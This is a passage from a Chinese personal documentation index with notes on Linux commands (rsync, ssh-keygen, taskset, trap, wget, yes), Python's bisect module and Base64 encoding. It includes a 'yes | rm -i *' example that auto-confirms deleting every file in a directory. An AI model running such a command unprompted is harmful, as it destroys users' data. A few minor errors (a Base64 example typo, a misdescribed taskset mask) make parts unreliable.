rsync使用所谓的\"rsync算法\"来使本地和远程两个主机之间的文件达到同步，\n这个算法只传送两个文件的不同部分，而不是每次都整份传送，因此速度相当快。\nrsync是一个功能非常强大的工具，其命令也有很多功能特色选项，我们下面就对它的选项一一进行分析说明。 语法: rsync [OPTION]... SRC DEST\nrsync [OPTION]... SRC [USER@]host:DEST\nrsync [OPTION]... [USER@]HOST:SRC DEST\nrsync [OPTION]... [USER@]HOST::SRC DEST\nrsync [OPTION]... SRC [USER@]HOST::DEST\nrsync [OPTION]... rsync://[USER@]HOST[:PORT]/SRC [DEST] 对应于以上六种命令格式，rsync有六种不同的工作模式 拷贝本地文件 当SRC和DES路径信息都不包含有单个冒号 \":\" 分隔符时就启动这种工作模式.\n如: rsync -a /data /backup 本地->远程 使用一个远程shell程序(如rsh、ssh)来实现将本地机器的内容拷贝到远程机器。 当DST路径地址包含单个冒号\":\"分隔符时启动该模式.\n如: rsync -avz *.c foo:src 远程->本地 使用一个远程shell程序(如rsh、ssh)来实现将远程机器的内容拷贝到本地机器。 当SRC地址路径包含单个冒号\":\"分隔符时启动该模式.\n如: rsync -avz foo:src/bar /data 远程rsync服务->本地 从远程rsync服务器中拷贝文件到本地机。 当SRC路径信息包含\"::\"分隔符时启动该模式.\n如: rsync -av root@192.168.78.192::www /databack 本地->远程rsync服务 从本地机器拷贝文件到远程rsync服务器中。 当DST路径信息包含\"::\"分隔符时启动该模式.\n如: rsync -av /databack root@192.168.78.192::www 列远程机的文件列表 类似于rsync传输，不过只要在命令中省略掉本地机信息即可.\n如: rsync -v rsync://192.168.78.192/www 选项 -v , --verbose 详细模式输出, 可以打印一些信息，比如文件列表、文件数量等 -q , --quiet 精简输出模式。 -c , --checksum 打开校验开关，强制对文件传输进行校验。 -a , --archive 归档模式，表示以递归方式传输文件，并保持所有文件属性，等于 -rlptgoD -a 选项后面可以跟一个 --no-OPTION，表示关闭 -r、-l、-p、-t、-g、-o、-D 中的某一个，比如: -a --no-l 等同于: -r、-p、-t、-g、-o、-D 选项。 -r , --recursive 表示以递归模式处理子目录，它主要是针对目录来说的，\n如果单独传一个文件不需要加 -r 选项，但是传输目录时必须加 -R , --relative 使用相对路径信息。 -b , --backup 创建备份，也就是对于目的已经存在有同样的文件名时，\n将老的文件重新命名为~filename。可以使用 --suffix 选项来指定不同的备份文件前缀。 --backup-dir 将备份文件(如~filename)存放在在目录下。 --suffix= <SUFFIX> 定义备份文件前缀(好像只有一个杠-suffix)。 -u , --update 仅仅进行更新，也就是跳过所有已经存在于DST，并且文件时间晚于要备份的文件，\n或者说把 DEST 中比 SRC 还新的文件排除掉，不会覆盖 -l , --links 保留软链接 -L , --copy-links 表示像对待常规文件一样处理软链接. 如果是 SRC 中有软链接文件，则加上该选项后，将会把软连接指向的目标文件复制到 DEST --copy-unsafe-links 仅仅拷贝指向SRC路径目录树以外的链接 --safe-links 忽略指向SRC路径目录树以外的链接。 -H , --hard-links 保留硬链接。 -p , --perms 保持文件权限 -o , --owner 保持文件属主信息 -g , --group 保持文件属组信息 -D , --devices 保持设备文件信息 -t , --times 保持文件时间信息 -S , --sparse 对稀疏文件进行特殊处理以节省DST的空间。 -n , --dry-run 显示哪些文件将被传输。 -w , --whole-file 拷贝文件，不进行增量检测。 -x , --one-file-system 不要跨越文件系统边界。 -B , --block-size= SIZE 检验算法使用的块尺寸，默认是700字节。 -e , --rsh= command 指定使用rsh、ssh方式进行数据同步。 --rsync-path= PATH 指定远程服务器上的rsync命令所在路径信息。 -C , --cvs-exclude 使用和CVS一样的方法自动忽略文件，用来排除那些不希望传输的文件。 --existing 仅仅更新那些已经存在于DST的文件，而不备份那些新创建的文件。 --delete 删除那些 DST 中 SRC 没有的文件 --delete-excluded 同样删除接收端那些被该选项指定排除的文件。 --delete-after 传输结束以后再删除。 --ignore-errors 及时出现IO错误也进行删除。 --max-delete= NUM 最多删除NUM个文件。 -P , --partial 保留那些因故没有完全传输的文件，加快随后的再次传输.\n参数允许恢复中断的传输. 不使用该参数时, rsync 会删除传输到一半被打断的文件 使用该参数后，传输到一半的文件也会同步到目标目录，下次同步时再恢复中断的传输。 一般需要与 --append 或 --append-verify 配合使用 --force 强制删除目录，即使不为空。 --numeric-ids 不将数字的用户和组id匹配为用户名和组名。 --timeout= time ip超时时间，单位为秒。 -I , --ignore-times 不跳过那些有同样的时间和长度的文件。 --size-only 当决定是否要备份文件时，仅仅察看文件大小而不考虑文件时间。 --modify-window= NUM 决定文件是否时间相同时使用的时间戳窗口，默认为0。 -T , --temp-dir= DIR 在DIR中创建临时文件。 --compare-dest= DIR 同样比较DIR中的文件来决定是否需要备份 -z , --compress 对备份的文件在传输时进行压缩处理 --exclude= PATTERN 指定排除不需要传输的文件模式, 等号后面跟文件名，可以是通配符模式（如 *.txt ） --include= PATTERN 指定不排除而需要传输的文件模式。 --exclude-from= FILE 排除FILE中指定模式的文件。 --include-from= FILE 不排除FILE指定模式匹配的文件。 --version 打印版本信息。 --address 绑定到特定的地址。 --config= FILE 指定其他的配置文件，不使用默认的rsyncd.conf文件。 --port= PORT 指定其他的rsync服务端口。 --blocking-io 对远程shell使用阻塞IO。 -s tats 给出某些文件的传输状态。 --progress 表示在同步的过程中可以看到同步的过程状态，比如统计要同步的文件数量、 同步的文件传输速度等 --log-format= formAT 指定日志文件格式。 --password-file= FILE 从FILE中得到密码。 --bwlimit= KBPS 限制I/O带宽，KBytes per second -h , --help 显示帮助信息 --append 参数指定文件接着上次中断的地方，继续传输 --append-verify 参数跟 --append 参数类似，但会对传输完成后的文件进行一次校验。\n如果校验失败，将重新发送整个文件。 对于初学者来说，记住最常用的几个即可，比如 -a、-v、-z、--delete 和 --exclude。","tags":"操作系统","url":"/yq-docs-operating-system-linux-Linux-instruction-rsync.html","loc":"/yq-docs-operating-system-linux-Linux-instruction-rsync.html"},{"title":"script","text":"创建终端会话的 text/x-script , 记录终端会话并生成可重播的脚本 用法: script [option] [file] 支持的选项: -a , --append 增加到输出. 在现有输出录制的文件的内容上追加新的内容 -c , --command <command> 直接执行给定的command指令而不是启动一个交互式终端. -r 子进程中返回退出代码 -e , --return return exit code of the child process -f , --flush run flush after each write 如果需要在输出到日志文件的同时，也可以查看日志文件的内容\n，可以使用 -f 参数 PS:可以用于教学,两个命令行接-f可以实时演示 --force use output file even when it is a link -q , --quiet be quiet. 使script命令以静默模式运行 -V , --version output version information and exit.\n输出script的版本信息，然后退出 -h , --help display this help and exit\n输出script的帮助信息，然后退出. -t, --timing[=<file>] output timing data to stderr (or to FILE).\n指明输出录制的时间数据 如, 记录终端的输出到文件: script -c \"pv some_file.txt\" /tmp/out.cast 结合用例说明 script 指令可以用来记录终端会话并生成可重播的脚本。\n使用script时,它会创建一个类型为text/x-script的文件,这个文件中包含了你在终端中所有操作的记录,包括输入和输出。 例如: script demo.script 这将启动 script,并将你的终端记录写入 demo.script 文件。\n在这个会话结束后,demo.script 就包含了一个可以重播你所有操作的脚本。 可以用如下命令回放这个会话脚本: scriptreplay demo.script 它将逐步重现你之前在终端中的所有操作。","tags":"操作系统","url":"/yq-docs-operating-system-linux-Linux-instruction-script.html","loc":"/yq-docs-operating-system-linux-Linux-instruction-script.html"},{"title":"rz","text":"在终端下载本地文件 相关指令 sz","tags":"操作系统","url":"/yq-docs-operating-system-linux-Linux-instruction-serious.html","loc":"/yq-docs-operating-system-linux-Linux-instruction-serious.html"},{"title":"ssh-keygen","text":"生成公私密钥 如生成rsa秘钥: ssh-keygen -t rsa 还有个可以配对使用的, 复制公钥到需要的主机，或其它方式发送公钥过去改名为authorized_keys: ssh-copy-id user@host 注解 ssh远程登录并执行指令的时候，authorized里的command参数需要加上 &/bin/bash 保持登陆: #authorized_keys\ncommand=\"ls -al & /bin/bash\" 更多可见 https://blog.csdn.net/alifrank/article/details/48241699 参数选项 -m 指定密钥的格式，PEM（也就是RSA格式）是之前使用的旧格式 -b 指定密钥长度； -e 读取openssh的私钥或者公钥文件； -C 添加注释； -f 指定用来保存密钥的文件名； -i 读取未加密的ssh-v2兼容的私钥/公钥文件，然后在标准输出设备上显示openssh兼容的私钥/公钥； -l 显示公钥文件的指纹数据； -N 提供一个新密语； -P 提供（旧）密语； -q 静默模式； -t 指定要创建的密钥类型 关于authorized_keys与authorized_keys2 authorized_keys vs authorized_keys2 In OpenSSH releases earlier than 3, the sshd man page said: The $HOME/.ssh/authorized_keys file lists the RSA keys that are permitted for RSA authentication in SSH protocols 1.3 and 1.5 Similarly,\nthe $HOME/.ssh/authorized_keys2 file lists the DSA and RSA keys that are permitted for public key authentication (PubkeyAuthentication) in SSH protocol 2.0. 也就是说在ssh的3版本之前: authorized_keys2多支持一个DSA加密算法 中文翻译: 在版本3之前的OpenSSH中，sshd手册页曾经说过：\n\n> $ HOME / .ssh / authorized_keys文件列出了SSH协议1.3和1.5中允许进行RSA身份验证的RSA密钥。\n类似地，$ HOME / .ssh / authorized_keys2文件列出了允许进行公共密钥身份验证的DSA和RSA密钥（ SSH协议2.0中的PubkeyAuthentication）。 版本3 的 发行公告 指出已弃用authorized_keys2，并且所有密钥都应放在authorized_keys文件中。 实际使用过程中openssl 1.1.1的版本中即使只有一个authorized_keys2也可以使用的（其他版本未测试） 登录执行指令 在公钥文件前加上: command=\"/bin/sh xxx.sh\" $pub_key 关于rsa格式秘钥在高版本的生成 现在使用命令 ssh-keygen -t rsa 生成ssh，默认是以新的格式生成，\nid_rsa的第一行变成了 \"BEGIN OPENSSH PRIVATE KEY\" 而不在是 \"BEGIN RSA PRIVATE KEY\" ，\n此时用来msyql、MongoDB，配置ssh登陆的话，\n可能会报 \"Resource temporarily unavailable. Authentication by key (/Users/youname/.ssh/id_rsa) failed (Error -16). (Error #35)\" 提示资源不可用，这就是id_rsa 格式不对造成的 解决方法（一）： 使用 ssh-keygen -m PEM -t rsa -b 4096 来生成 注解 -m PEM 指定密钥的格式，PEM（也就是RSA格式）是之前使用的旧格式 -b 4096 指定密钥长度为4096 -t rsa 指定要创建的密钥类型为RSA 原文链接： https://blog.csdn.net/lsp84ch80/article/details/87861990","tags":"操作系统","url":"/yq-docs-operating-system-linux-Linux-instruction-ssh-keygen.html","loc":"/yq-docs-operating-system-linux-Linux-instruction-ssh-keygen.html"},{"title":"stdbuf","text":"读取管道文件 -i 调整标准输入流缓冲区 -o 调整标准输出流缓冲区 -e 标准错误流缓冲区 L 行缓冲模式","tags":"操作系统","url":"/yq-docs-operating-system-linux-Linux-instruction-stdbuf.html","loc":"/yq-docs-operating-system-linux-Linux-instruction-stdbuf.html"},{"title":"tail","text":"显示指定文件的末尾若干行 -n<N>, ——line=<N> 输出文件的尾部N（N位数字）行内容 -f 显示最新内容","tags":"操作系统","url":"/yq-docs-operating-system-linux-Linux-instruction-tail.html","loc":"/yq-docs-operating-system-linux-Linux-instruction-tail.html"},{"title":"taskset","text":"taskset命令用于设置进程（或 线程）的处理器亲和性（Processor Affinity），\n可以将进程（或 线程）绑定到特定的一个 或 多个CPU上去执行，\n而不允许将进程（或 线程）调度到其他的CPU上。 将进程绑定到指定的CPU上运行，这样可以避免大量的进程切换产生的无效时间。\n通过 taskset 命令可将某个进程与某个CPU核心绑定，使得其仅在与之绑定的CPU核心上运行。 线程是最小的内核执行调度单元，因此，准确地说是将某个线程与某个CPU核心绑定，而非某个进程。 taskset命令是依据线程PID（TID）查询或设置线程的CPU亲和性（与哪个CPU核心绑定）。 常用参数 -a , --all-tasks 设置或检索所有任务（线程）的CPU相关性对于给定的PID -c , --cpu-list 将掩码解释为处理器的数字列表 -p , --pid 在现有PID上操作，不要启动新任务 -V , --version 显示版本信息 -h , --help 显示帮助信息 例子: [root@localhost ~]# ps -eLf | grep qemu\nroot       1389   1339   1389  0    3 14:48 pts/0    00:00:10 /usr/libexec/qemu-kvm -cpu SandyBridge -vnc 0.0.0.0:1 centos1708.img\nroot       1389   1339   1393  2    3 14:48 pts/0    00:00:36 /usr/libexec/qemu-kvm -cpu SandyBridge -vnc 0.0.0.0:1 centos1708.img\nroot       1389   1339   1395  0    3 14:48 pts/0    00:00:00 /usr/libexec/qemu-kvm -cpu SandyBridge -vnc 0.0.0.0:1 centos1708.img\nroot       2638   1409   2638  0    1 15:10 pts/1    00:00:00 grep --color=auto qemu\n[root@localhost ~]# taskset -p 1393\npid 1393's current affinity mask: ff\n[root@localhost ~]# taskset -p 1389\npid 1389's current affinity mask: ff 输出结构处理器亲和性掩码是ff，表示进程（或 线程）可以在Host上让任何一个CPU运行。\n查看进程（或 线程）允许允许CPU范围使用 -c 参数。\n由于我的Host CPU是4核2线程，因此有8颗逻辑CPU: [root@localhost ~]# taskset -cp 1393\npid 1393's current affinity list: 0-7\n[root@localhost ~]# taskset -cp 1389\npid 1389's current affinity list: 0-7 更改具体某一进程（或 线程）CPU亲和性 指令: taskset -p  hexadecimal mask PID/LWP 上面1393号线程可以在0~7号CPU之间允许，现在设置掩码0x11（二进制0001 0001），表示可以在0~4号CPU上允许: [root@localhost ~]# taskset -p 0x11  1393\npid 1393's current affinity mask: ff\npid 1393's new affinity mask: 11\n[root@localhost ~]# taskset -p   1393\npid 1393's current affinity mask: 11\n[root@localhost ~]# taskset -cp   1393\npid 1393's current affinity list: 0,4 为具体某一进程（或 线程）CPU亲和性指定一组范围 使用-c参数: [root@localhost ~]# taskset -cp 0,3  1393\npid 1393's current affinity list: 0,4\npid 1393's new affinity list: 0,3\n[root@localhost ~]# taskset -cp   1393\npid 1393's current affinity list: 0,3","tags":"操作系统","url":"/yq-docs-operating-system-linux-Linux-instruction-taskset.html","loc":"/yq-docs-operating-system-linux-Linux-instruction-taskset.html"},{"title":"trap","text":"指定在接收到信号之后将要采取的动作 用法: trap \"动作\" \"信号\" 支持的信号见: linux系统信号 例如，收到0信号执行 exit 1 trap \"exit 1\" 0 与set协作 set 支持在脚本执行错误时退出,\n那如果要在退出时候打印一些消息或者清理应该如何做? set -e 在检查到命令异常返回时并没有信号的产生,\n故trap指令就不能写信号了, 而是写bash内置定义的 ERR (不区分大小写): #!/bin/bash\n\nerror_exit() {\n  echo \"error, exit\"\n}\n\nset -e\ntrap error_exit ERR\n\necho 1\nss\necho 2\necho 3 注解 dash中貌似没有内置对ERR的支持 对ERR的说明: 在 Bash 中，ERR 并不是一个具体的信号。在错误检测机制中，ERR 是对发生错误退出的状态的引用.\n虽然 ERR 不是一个实际的信号，但它可以被 trap 命令捕获和处理.","tags":"操作系统","url":"/yq-docs-operating-system-linux-Linux-instruction-trap.html","loc":"/yq-docs-operating-system-linux-Linux-instruction-trap.html"},{"title":"userdel","text":"-f 强制删除  即使登陆 -r 删除时 删除所有相关文件","tags":"操作系统","url":"/yq-docs-operating-system-linux-Linux-instruction-userdel.html","loc":"/yq-docs-operating-system-linux-Linux-instruction-userdel.html"},{"title":"watch","text":"周期执行给定的指令: watch （选项） （参数） 选项 -n , --interval watch缺省每2秒运行一下程序，可以用-n或-interval来指定间隔的时间。 -d , --differences 用-d或--differences 选项watch 会高亮显示变化的区域。\n而-d=cumulative选项会把变动过的地方(不管最近的那次有没有变动)都高亮显示出来。 -t , -n o-title 会关闭watch命令在顶部的时间间隔,命令，当前时间的输出。 -h , --help 查看帮助文档","tags":"操作系统","url":"/yq-docs-operating-system-linux-Linux-instruction-watch.html","loc":"/yq-docs-operating-system-linux-Linux-instruction-watch.html"},{"title":"wget","text":"从指定的URL下载文件。 wget非常稳定，它在带宽很窄的情况下和不稳定网络中有很强的适应性，\n如果是由于网络的原因下载失败，wget会不断的尝试，直到整个文件下载完毕。\n如果是服务器打断下载过程，它会再次联到服务器上从停止的地方继续下载。\n这对从那些限定了链接时间的服务器上下载大文件非常有用。 wget支持HTTP，HTTPS和FTP协议，可以使用HTTP代理。\n所谓的自动下载是指，wget可以在用户退出系统的之后在后台执行。\n这意味这你可以登录系统，启动一个wget下载任务，然后退出系统，\nwget将在后台执行直到任务完成，\n相对于其它大部分浏览器在下载大量数据时需要用户一直的参与，这省去了极大的麻烦。 用于从网络上下载资源，没有指定目录，下载资源回默认为当前目录。\nwget虽然功能强大，但是使用起来还是比较简单： 支持断点下传功能 这一点，也是网络蚂蚁和FlashGet当年最大的卖点，\n现在，Wget也可以使用此功能，那些网络不是太好的用户可以放心了； 同时支持FTP和HTTP下载方式 尽管现在大部分软件可以使用HTTP方式下载，但是，有些时候，仍然需要使用FTP方式下载软件； 支持代理服务器 对安全强度很高的系统而言，一般不会将自己的系统直接暴露在互联网上，\n所以，支持代理是下载软件必须有的功能； 设置方便简单 可能，习惯图形界面的用户已经不是太习惯命令行了，\n但是，命令行在设置上其实有更多的优点，最少，鼠标可以少点很多次，也不要担心是否错点鼠标； 程序小，完全免费 程序小可以考虑不计，因为现在的硬盘实在太大了；\n完全免费就不得不考虑了，即使网络上有很多所谓的免费软件，但是，这些软件的广告却不是我们喜欢的。 语法 : wget [参数] [URL地址] 选项 启动参数： -V, –-version 显示wget的版本后退出 -h, –-help 打印语法帮助 -b, –-background 启动后转入后台执行 -e, –-execute=COMMAND 执行 .wgetrc 格式的命令， wgetrc格式参见/etc/wgetrc或~/.wgetrc 记录和输入文件参数： -o, –-output-file=FILE 把记录写到FILE文件中 -a, –-append-output=FILE 把记录追加到FILE文件中 -d, –-debug 打印调试输出 -q, –-quiet 安静模式(没有输出) -v, –-verbose 冗长模式(这是缺省设置) -nv, –-non-verbose 关掉冗长模式，但不是安静模式 -i, –-input-file=FILE 下载在FILE文件中出现的URLs -F, –-force-html 把输入文件当作HTML格式文件对待 -B, –-base=URL 将URL作为在-F -i参数指定的文件中出现的相对链接的前缀 –-sslcertfile=FILE 可选客户端证书 –-sslcertkey=KEYFILE 可选客户端证书的KEYFILE –-egd-file=FILE 指定EGD socket的文件名 下载参数： –-bind-address=ADDRESS 指定本地使用地址(主机名或IP，当本地有多个IP或名字时使用) -t, –-tries=NUMBER 设定最大尝试链接次数(0 表示无限制). -O –-output-document=FILE 把文档写到FILE文件中 -nc, –-no-clobber 不要覆盖存在的文件或使用.#前缀 -c, –-continue 接着下载没下载完的文件 –progress=TYPE 设定进程条标记 -N, –-timestamping 不要重新下载文件除非比本地文件新 -S, –-server-response 打印服务器的回应 –-spider 不下载任何东西 -T, –-timeout=SECONDS 设定响应超时的秒数 -w, –-wait=SECONDS 两次尝试之间间隔SECONDS秒 –waitretry=SECONDS 在重新链接之间等待1…SECONDS秒 –random-wait 在下载之间等待0…2*WAIT秒 -Y, –-proxy=on/off 打开或关闭代理 -Q, –-quota=NUMBER 设置下载的容量限制 –limit-rate=RATE 限定下载输率 目录参数： -nd –-no-directories 不创建目录 -x, –-force-directories 强制创建目录 -nH, –-no-host-directories 不创建主机目录 -P, –-directory-prefix=PREFIX 将文件保存到目录 PREFIX/… –cut-dirs=NUMBER 忽略 NUMBER层远程目录 HTTP 选项参数： -–http-user=USER 设定HTTP用户名为 USER. -–http-passwd=PASS 设定http密码为 PASS -C, –-cache=on/off 允许/不允许服务器端的数据缓存 (一般情况下允许) -E, –-html-extension 将所有text/html文档以.html扩展名保存 -–ignore-length 忽略 Content-Length 头域 -–header=STRING 在headers中插入字符串 STRING -–proxy-user=USER 设定代理的用户名为 USER -–proxy-passwd=PASS 设定代理的密码为 PASS -–referer=URL 在HTTP请求中包含 Referer: URL 头 -s, –-save-headers 保存HTTP头到文件 -U, –-user-agent=AGENT 设定代理的名称为 AGENT而不是 Wget/VERSION -–no-http-keep-alive 关闭 HTTP活动链接 (永远链接) –-cookies=off 不使用 cookies –-load-cookies=FILE 在开始会话前从文件 FILE中加载cookie -–save-cookies=FILE 在会话结束后将 cookies保存到 FILE文件中 FTP 选项参数： -nr, -–dont-remove-listing 不移走 .listing 文件 -g, -–glob=on/off 打开或关闭文件名的 globbing机制 -–passive-ftp 使用被动传输模式 (缺省值). -–active-ftp 使用主动传输模式 -–retr-symlinks 在递归的时候，将链接指向文件(而不是目录) 递归下载参数： -r, -–recursive 递归下载－－慎用! -l, -–level=NUMBER 最大递归深度 (inf 或 0 代表无穷) –-delete-after 在现在完毕后局部删除文件 -k, –-convert-links 转换非相对链接为相对链接 -K, –-backup-converted 在转换文件X之前，将之备份为 X.orig -m, –-mirror 等价于 -r -N -l inf -nr -p, –-page-requisites 下载显示HTML文件的所有图片 递归下载中的包含和不包含(accept/reject)： -A, –-accept=LIST 分号分隔的被接受扩展名的列表 -R, –-reject=LIST 分号分隔的不被接受的扩展名的列表 -D, –-domains=LIST 分号分隔的被接受域的列表 –-exclude-domains=LIST 分号分隔的不被接受的域的列表 –-follow-ftp 跟踪HTML文档中的FTP链接 –-follow-tags=LIST 分号分隔的被跟踪的HTML标签的列表 -G, –-ignore-tags=LIST 分号分隔的被忽略的HTML标签的列表 -H, –-span-hosts 当递归时转到外部主机 -L, –-relative 仅仅跟踪相对链接 -I, –-include-directories=LIST 允许目录的列表 -X, –-exclude-directories=LIST 不被包含目录的列表 -np, –-no-parent 不要追溯到父目录 wget -S –-spider url 不下载只显示过程 --limit-rate=300k    限制带宽为300k","tags":"操作系统","url":"/yq-docs-operating-system-linux-Linux-instruction-wett.html","loc":"/yq-docs-operating-system-linux-Linux-instruction-wett.html"},{"title":"whereis","text":"查找环境变量中的文件 -l 列出whereis会去查询的几个目录 -b 只找binary格式文件 -m 只找在说明文件manual路径下文件 -s 只找source来源文件 -u 搜寻不在上述三个项目中的其他文件","tags":"操作系统","url":"/yq-docs-operating-system-linux-Linux-instruction-whereis.html","loc":"/yq-docs-operating-system-linux-Linux-instruction-whereis.html"},{"title":"wireshark","text":"图形接口封包的获取，与 tcpdump 的区别是tcpdump是文字接口封包获取 这玩意儿好像是一个软件","tags":"操作系统","url":"/yq-docs-operating-system-linux-Linux-instruction-wireshark.html","loc":"/yq-docs-operating-system-linux-Linux-instruction-wireshark.html"},{"title":"yes","text":"一直输出y换行,\n对于有些交互式的指令且需要输入y来确认时可以使用, 比如: yes | apt install ssh 效果等价于: apt install ssh -y yes命令用于重复输出字符串（output a string repeatedly until killed）。\n这个命令可以帮你自动回答命令行提示，\n例如，进入一个含有多个文件的目录，执行: yes | rm -i * 所有的: rm: remove regular empty file `xxx'? 提示都会被自动回答 y。这在编写脚本程序的时候会很用处。\nyes命令还有另外一个用途，可以用来生成大的文本文件。（-i交互式） 参数 i 会交互式询问 yes 后面直接跟单词或者字符表示一直输出这个","tags":"操作系统","url":"/yq-docs-operating-system-linux-Linux-instruction-yes.html","loc":"/yq-docs-operating-system-linux-Linux-instruction-yes.html"},{"title":"bisect","text":"bisect --- 数组二分查找算法 官网: https://docs.python.org/zh-cn/3/library/bisect.html 这个模块对有序列表提供了支持，使得他们可以在插入新数据仍然保持有序。\n对于长列表，如果其包含元素的比较操作十分昂贵的话，这可以是对更常见方法的改进。\n这个模块叫做 bisect 因为其使用了基本的二分（bisection）算法。源代码也可以作为很棒的算法示例（边界判断也做好啦！） 支持的函数 bisect.bisect_left(a, x, lo=0, hi=len(a), *, key=None) a: 需要插入的序列 x: 需要插入的值 lo: 序列a的起始位置 hi: 序列a的结束位置. 实际只从 a[lo: hi] 这个子集中找 key: 指定带有单个参数的 key function 用来从数组的每个元素中提取比较键。\n为了支持搜索复杂记录，键函数不会被应用到 x 值。 如果 key 为 None，则将直接进行元素比较而不需要中间的函数调用。 在 a 中找到 x 合适的插入点以维持有序。\n参数 lo 和 hi 可以被用于确定需要考虑的子集；默认情况下整个列表都会被使用。\n如果 x 已经在 a 里存在，那么插入点会在已存在元素之前（也就是左边）。\n如果 a 是列表（list）的话，返回值是可以被放在 list.insert() 的第一个参数的。 返回的插入点 i 将数组 a 分成两半，使得 all(val < x for val in a[lo : i]) 在左半边\n而 all(val >= x for val in a[i : hi]) 在右半边。 在 3.10 版更改: 增加了 key 形参。 bisect.bisect_right(a, x, lo=0, hi=len(a), *, key=None) bisect_right 与 bisect_left 的区别 如果有序列表a没有元素x, 那么两者返回的索引相同,\n返回的索引地址, 使得arr的insert插入该值还是有序的 如果有序列表a包含元素x,\nleft返回已包含元素x的索引,\nright返回的索引值是在left的基础上加一 如: data = [2, 5, 6, 9]\n\nprint(f'数组: {data}')\nfor x in (0, 2, 5, 8, 9, 10):\n    l = bisect.bisect_left(data, x)\n    r = bisect.bisect_right(data, x)\n\n    print(f\"查找: {x},  left结: {l}, right结: {r}\") 输出: 数组: [2, 5, 6, 9]\n查找: 0,  left结: 0, right结: 0\n查找: 2,  left结: 0, right结: 1\n查找: 5,  left结: 1, right结: 2\n查找: 8,  left结: 3, right结: 3\n查找: 9,  left结: 3, right结: 4\n查找: 10,  left结: 4, right结: 4 bisect.bisect(a, x, lo=0, hi=len(a), *, key=None) 类似于 bisect_left()，但是返回的插入点是 a 中已存在元素 x 的右侧。 返回的插入点 i 将数组 a 分成两半，使得\n左半边为 all(val <= x for val in a[lo : i]) 而右半边为 all(val > x for val in a[i : hi]) key 指定带有单个参数的 key function 用来从数组的每个元素中提取比较键。\n为了支持搜索复杂记录，键函数不会被应用到 x 值。 如果 key 为 None，则将直接进行元素比较而不需要中间的函数调用。 在 3.10 版更改: 增加了 key 形参。 bisect.insort_left(a, x, lo=0, hi=len(a), *, key=None) 按照已排序顺序将 x 插入到 a 中。 此函数首先会运行 bisect_left() 来定位一个插入点。 然后，它会在 a 上运行 insert() 方法在正确的位置插入 x 以保持排序顺序。 为了支持将记录插入到表中，key 函数（如果存在）将被应用到 x 用于搜索步骤但不会用于插入步骤。 请记住 O(log n) 搜索是由缓慢的 O(n) 抛入步骤主导的。 在 3.10 版更改: 增加了 key 形参。 bisect.insort_right(a, x, lo=0, hi=len(a), *, key=None) . bisect.insort(a, x, lo=0, hi=len(a), *, key=None) 类似于 insort_left()，但是把 x 插入到 a 中已存在元素 x 的右侧。 此函数首先会运行 bisect_right() 来定位一个插入点。 然后，它会在 a 上运行 insert() 方法在正确的位置插入 x 以保持排序顺序。 为了支持将记录插入到表中，key 函数（如果存在）将被应用到 x 用于搜索步骤但不会用于插入步骤。 请记住 O(log n) 搜索是由缓慢的 O(n) 抛入步骤主导的。 在 3.10 版更改: 增加了 key 形参。 当使用 bisect() 和 insort() 编写时间敏感的代码时，请记住以下概念: 二分法对于搜索一定范围的值是很高效的。 对于定位特定的值，则字典的性能更好。 insort() 函数的时间复杂度为 O(n) 因为对数时间的搜索步骤被线性时间的插入步骤所主导。\n这些搜索函数都是无状态的并且会在它们被使用后丢弃键函数的结果。\n因此，如果在一个循环中使用搜索函数，则键函数可能会在同一个数据元素上被反复调用。\n如果键函数速度不快，请考虑用 functools.cache() 来包装它以避免重复计算。\n另外，也可以考虑搜索一个预先计算好的键数组来定位插入点。","tags":"后端; python","url":"/yq-docs-rear-end-python-python-standard-library-bisect.html","loc":"/yq-docs-rear-end-python-python-standard-library-bisect.html"},{"title":"Base64编码","text":"编码表: | **索引** | **对应字符** | **索引** | **对应字符** | **索引** | **对应字符** | **索引** | **对应字符** |\n| ------ | -------- | ------ | -------- | ------ | -------- | ------ | -------- |\n| 0      | **A**    | 17     | **R**    | 34     | **i**    | 51     | **z**    |\n| 1      | **B**    | 18     | **S**    | 35     | **j**    | 52     | **0**    |\n| 2      | **C**    | 19     | **T**    | 36     | **k**    | 53     | **1**    |\n| 3      | **D**    | 20     | **U**    | 37     | **l**    | 54     | **2**    |\n| 4      | **E**    | 21     | **V**    | 38     | **m**    | 55     | **3**    |\n| 5      | **F**    | 22     | **W**    | 39     | **n**    | 56     | **4**    |\n| 6      | **G**    | 23     | **X**    | 40     | **o**    | 57     | **5**    |\n| 7      | **H**    | 24     | **Y**    | 41     | **p**    | 58     | **6**    |\n| 8      | **I**    | 25     | **Z**    | 42     | **q**    | 59     | **7**    |\n| 9      | **J**    | 26     | **a**    | 43     | **r**    | 60     | **8**    |\n| 10     | **K**    | 27     | **b**    | 44     | **s**    | 61     | **9**    |\n| 11     | **L**    | 28     | **c**    | 45     | **t**    | 62     | **+**    |\n| 12     | **M**    | 29     | **d**    | 46     | **u**    | 63     | **/**    |\n| 13     | **N**    | 30     | **e**    | 47     | **v**    |        |          |\n| 14     | **O**    | 31     | **f**    | 48     | **w**    |        |          |\n| 15     | **P**    | 32     | **g**    | 49     | **x**    |        |          |\n| 16     | **Q**    | 33     | **h**    | 50     | **y**    |        |          | 例子： 转换前 10101101,10111010,01110110 转换后 00101011, 00011011 ,00101001 ,00110110 十进制 43 27 41 54 对应码表中的值 r b p 2 所以上面的24位编码，编码后的Base64值为 rbp2 解码同理，把 rbq2 的二进制位连接上再重组得到三个8位值，得出原码。 （解码只是编码的逆过程，有关MIME的RFC还有很多，如果需要详细情况请自行查找。） 过程： 第一个字节，根据源字节的第一个字节处理。 规则：源第一字节右移两位，去掉低2位，高2位补零。 既：00 + 高6位 第二个字节，根据源字节的第一个字节和第二个字节联合处理。 规则如下，第一个字节高6位去掉然后左移四位，第二个字节右移四位 即：源第一字节低2位 + 源第2字节高4位 第三个字节，根据源字节的第二个字节和第三个字节联合处理， 规则第二个字节去掉高4位并左移两位（得高6位），第三个字节右移6位并去掉高6位（得低2位），相加即可 第四个字节，规则，源第三字节去掉高2位即可: //用更接近于编程的思维来说，编码的过程是这样的：\n\n//第一个字符通过右移2位获得第一个目标字符的Base64表位置，根据这个数值取到表上相应的字符，就是第一//个目标字符。\n\n//然后将第一个字符与0x03(00000011)进行与(&)操作并左移4位,接着第二个字符右移4位与前者相或(|)，即获得第二个目标字符。\n\n//再将第二个字符与0x0f(00001111)进行与(&)操作并左移2位,接着第三个字符右移6位与前者相或(|)，获得第三个目标字符。\n\n//最后将第三个字符与0x3f(00111111)进行与(&)操作即获得第四个目标字符。\n\n//在以上的每一个步骤之后，再把结果与 0x3F 进行 AND [位操作](https://baike.baidu.com/item/位操作) ，就可以得到编码后的字符了。 